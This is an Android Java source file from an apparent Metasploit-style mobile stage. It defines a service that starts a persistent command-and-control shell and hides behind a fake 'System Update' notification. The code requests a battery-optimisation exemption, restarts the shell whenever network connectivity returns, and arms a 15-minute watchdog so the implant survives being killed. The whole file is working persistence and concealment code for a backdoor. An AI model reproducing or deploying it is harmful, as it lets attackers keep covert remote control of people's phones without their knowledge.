package com.metasploit.stage;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

/**
 * Foreground service that starts AgentCore (persistent C2 shell),
 * registers network callback for connectivity-triggered resurrection,
 * requests battery-opt exemption, and sets up AlarmManager watchdog.
 *
 * START_STICKY = system restarts this service if killed.
 * foregroundServiceType="dataSync" = survives Android 14+ background restrictions.
 */
public class DlsService extends Service {

    private static final String TAG = "SysUpd";
    private static final int NOTIFY_ID = 1;
    private static final String CHAN_ID = "dls_sync";

    private volatile boolean alive = true;

    @Override
    public void onCreate() {
        super.onCreate();
        makeForeground();
        requestBatteryOptExemption();
        registerNetworkCallback();
        armWatchdog();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // (Re)launch the C2 shell — AgentCore uses AtomicBoolean singleton
        // so only the first caller actually starts threads.
        AgentCore.run();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        alive = false;
        // Disarm watchdog before dying
        cancelWatchdog();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // -----------------------------------------------------------------------
    // Foreground notification — looks like a system sync notification
    // -----------------------------------------------------------------------
    private void makeForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHAN_ID, "System Sync", NotificationManager.IMPORTANCE_MIN);
            ch.setDescription("");
            ch.setShowBadge(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
        }

        Notification n = new Notification.Builder(this, CHAN_ID)
            .setContentTitle("System Update")
            .setContentText("Syncing system components")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .build();

        startForeground(NOTIFY_ID, n);
    }

    // -----------------------------------------------------------------------
    // Battery optimisation exemption — tells Doze to leave us alone
    // -----------------------------------------------------------------------
    private void requestBatteryOptExemption() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent i = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                i.setData(android.net.Uri.parse("package:" + getPackageName()));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            }
        } catch (Exception ignored) {}
    }

    // -----------------------------------------------------------------------
    // Network callback — resurrect on connectivity gain
    // -----------------------------------------------------------------------
    private void registerNetworkCallback() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (cm == null) return;
            NetworkRequest req = new NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build();
            cm.registerNetworkCallback(req, new ConnectivityManager.NetworkCallback() {
                @Override
                public void onAvailable(Network n) {
                    // Network came up — ensure service + agent are running
                    AgentCore.run();
                }
            });
        } catch (Exception ignored) {}
    }

    // -----------------------------------------------------------------------
    // AlarmManager watchdog — fires every 15 min, restarts service if dead
    // -----------------------------------------------------------------------
    private void armWatchdog() {
        try {
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            if (am == null) return;
            Intent i = new Intent(this, WatchdogReceiver.class);
            i.setAction("com.metasploit.stage.WATCHDOG_FIRE");
            PendingIntent pi = PendingIntent.getBroadcast(
                this, 0, i, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            long interval = 15 * 60 * 1000L; // 15 min
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    android.os.SystemClock.elapsedRealtime() + interval, pi);
            } else {
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    android.os.SystemClock.elapsedRealtime() + interval, pi);
            }
        } catch (Exception ignored) {}
    }

    private void cancelWatchdog() {
        try {
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            if (am == null) return;
            Intent i = new Intent(this, WatchdogReceiver.class);
            i.setAction("com.metasploit.stage.WATCHDOG_FIRE");
            PendingIntent pi = PendingIntent.getBroadcast(
                this, 0, i, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            am.cancel(pi);
        } catch (Exception ignored) {}
    }
}
